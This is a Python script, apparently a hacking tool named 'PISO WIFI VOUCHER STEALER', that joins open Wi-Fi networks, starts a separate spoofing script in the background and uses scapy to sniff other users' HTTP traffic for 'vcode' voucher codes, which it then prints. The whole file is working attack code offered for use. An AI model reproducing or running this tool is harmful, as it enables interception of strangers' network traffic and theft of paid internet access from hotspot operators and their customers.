# coded by 0xbit

import threading
import subprocess
import os
import sys
from tabulate import tabulate
import scapy.all as scapy
from scapy.layers import http
import wifi
import time
from pystyle import *

dark = Col.dark_gray
light = Colors.StaticMIX((Col.cyan, Col.purple, Col.gray))
acc = Colors.StaticMIX((Col.cyan, Col.purple, Col.blue, Col.gray))
purple = Colors.StaticMIX((Col.purple, Col.blue))
bpurple = Colors.StaticMIX((Col.purple, Col.cyan))

w_interface = 'wlan0'

def stage(text: str, symbol: str = '...', col1=light, col2=None) -> str:
    if col2 is None:
        col2 = light if symbol == '...' else purple
    if symbol in {'...', '!!!'}:
        return f"""     {Col.Symbol(symbol, col1, dark)} {col2}{text}{Col.reset}"""
    else:
        return f""" {Col.Symbol(symbol, col1, dark)} {col2}{text}{Col.reset}"""


text = r'''
                                                  
                            
                    ▓▓▓▓▓▓██                      
                    ▓▓▓▓▓▓▓▓▓▓▓▓██                
                  ▓▓░░██░░░░░░▓▓██                
                ░░░░░░██▒▒██░░██      I SEE VOUCHER             
                  ░░░░░░░░░░░░▒▒▒▒    I SEE VOUCHER            
                  ▓▓▓▓▓▓▓▓▓▓░░░░▒▒    I SEE VOUCHER            
                  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                  
                  ░░▓▓▓▓░░▓▓▓▓▓▓                  
                ██▒▒▓▓▓▓▒▒░░▓▓▓▓                  
                ▓▓░░▓▓▓▓▓▓▓▓░░                    
                ░░░░▓▓▓▓▓▓░░░░                    
                    ░░░░░░░░       CODED BY: 0XBIT     
                                                  

                    
'''

text1 = '''        ╒═══════════════════════════╕
         │ PISO WIFI VOUCHER STEALER │
         ╘═══════════════════════════╛'''


def check_and_fix_wifi_conflict(interface_name):
    try:
        process = subprocess.Popen(["sudo", "lsof", "-i", f"{interface_name}"],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, _ = process.communicate()
        if stdout:
            disconnect_from_wifi()

        else:
            pass
    except subprocess.CalledProcessError as e:
        pass

def disconnect_from_wifi():
    try:
        subprocess.run(["nmcli", "device", "disconnect", w_interface],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except subprocess.CalledProcessError:
        pass

def connect_to_wifi(ssid):
    try:
        subprocess.run(["nmcli", "device", "wifi", "connect", ssid],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except subprocess.CalledProcessError:
        pass

def scan_open_wifi():
    wifi_list = wifi.Cell.all(w_interface)
    open_networks = [cell for cell in wifi_list if not cell.encrypted]
    return open_networks

def print_wifi_list(networks):
    print(tabulate([['Available Open Wi-Fi Networks']], tablefmt='fancy_grid'))
    print('')
    for idx, network in enumerate(networks, start=1):
        print(f"{idx}: {network.ssid}")


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ['vcode'.encode('utf-8')]
            for key in keys:
                if key in load:
                    data_captured = load.decode('utf-8')
                    data_captured = data_captured.replace('vcode=', '')
                    split_line = data_captured.split()
                    if len(split_line) == 1:
                        _vcode = split_line[0]
                        voucher = _vcode.upper()
                        print(tabulate([['Voucher: ', f'{voucher}']], tablefmt='fancy_grid'))
                        break

def packet_filter(packet):
    process_packet(packet)


def main():
    os.system('clear')
    open_networks = scan_open_wifi()

    if not open_networks:
        print("No open Wi-Fi networks found.")
        return

    print_wifi_list(open_networks)

    try:
        selected_number = int(input("\n[?] DEDSEC: "))
        if selected_number == 0:
            return menu()
        elif 1 <= selected_number <= len(open_networks):
            target_wifi = open_networks[selected_number - 1].ssid
            connect_to_wifi(target_wifi)
        else:
            print("Please choose a valid number.")
    except ValueError:
        print("Invalid input")

def main_code():
    banner()
    iface = 'wlan0'
    try:
        while True:
            scapy.sniff(iface=iface, prn=packet_filter, store=False)
    except KeyboardInterrupt:
        disconnect_from_wifi()
        sys.exit(0)

def banner():
    os.system('clear')
    print(Colorate.Diagonal(Colors.DynamicMIX((purple, dark)), (text)))
    print(((purple)), (text1))
    
def run_script():
    subprocess.run(["python3", "spoof.py"])

if __name__ == "__main__":
    check_and_fix_wifi_conflict(w_interface)
    time.sleep(1)
    banner()
    input('\n\t  [?] PRESS ENTER TO START [?] \r')
    disconnect_from_wifi()
    main()

    main_thread = threading.Thread(target=run_script)
    main_thread.daemon = True
    main_thread.start()

    banner()
    main_code()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        disconnect_from_wifi()
        sys.exit(0)
